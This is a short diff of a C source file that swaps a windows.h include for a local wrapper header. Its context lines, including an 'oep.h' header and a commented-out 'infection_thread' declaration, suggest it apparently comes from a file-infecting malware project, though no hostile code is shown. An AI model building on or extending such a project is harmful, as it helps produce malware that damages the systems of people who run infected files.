@@ -1,6 +1,5 @@
 #include <stdint.h>
 #include <stdio.h>
-#include <windows.h>
 
 #include "checksum.h"
 #include "checksum_list.h"
@@ -14,6 +13,7 @@
 #include "oep.h"
 #include "string_generator.h"
 #include "utility.h"
+#include "windows_wrapper.h"
 
 // static DWORD WINAPI infection_thread(LPVOID param);
 
